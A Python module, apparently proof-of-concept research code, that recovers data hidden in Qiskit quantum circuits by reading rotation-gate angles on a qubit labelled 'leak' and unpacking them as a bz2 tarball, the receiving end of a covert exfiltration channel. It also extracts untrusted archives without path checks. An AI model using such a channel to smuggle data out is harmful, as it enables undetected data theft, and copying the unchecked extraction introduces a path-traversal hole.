import io
import tarfile
import tempfile
from pathlib import Path

from qiskit.circuit import QuantumCircuit, QuantumRegister, Qubit


def numbers_to_data(numbers: list, block_size=128):
    data = b""
    for number in numbers[:-1]:
        data += number.to_bytes(block_size)
    # Last block is special because we have to remove the padding
    padding = numbers[-1].to_bytes(block_size)[0]
    data += numbers[-1].to_bytes(block_size)[padding:]
    return data


def recover_data(qc: QuantumCircuit, block_size=128) -> bytes:
    if qc.layout is None:
        target_qubit = qc.qubits[-1]
    else:
        mapped_index = qc.layout.input_qubit_mapping[
            Qubit(QuantumRegister(1, "leak"), 0)
        ]
        index_qubit = qc.layout.initial_index_layout()[mapped_index]
        target_qubit = qc.qubits[index_qubit]

    numbers = []
    for instruction in qc.data:
        # Not ancilla qubit
        if instruction.qubits[0] != target_qubit:
            continue

        # Reset
        if instruction.operation.name == "reset":
            continue

        # Useful gate
        if instruction.operation.name == "rz":
            numbers.append(instruction.operation.params[0])

    if not numbers:
        return b""

    return numbers_to_data(numbers, block_size)


def extract_data(data: bytes, path=None) -> None:
    if path is None:
        extract_path = Path(tempfile.mkdtemp())
    else:
        extract_path = Path(path)

    with io.BytesIO(data) as file:
        with tarfile.open(fileobj=file, mode="r:bz2") as tarball:
            try:
                tarball.extractall(path=extract_path)
                print(f"Leaked data extracted to: {extract_path}")
            except Exception:
                print("Extraction of leaked data failed!")
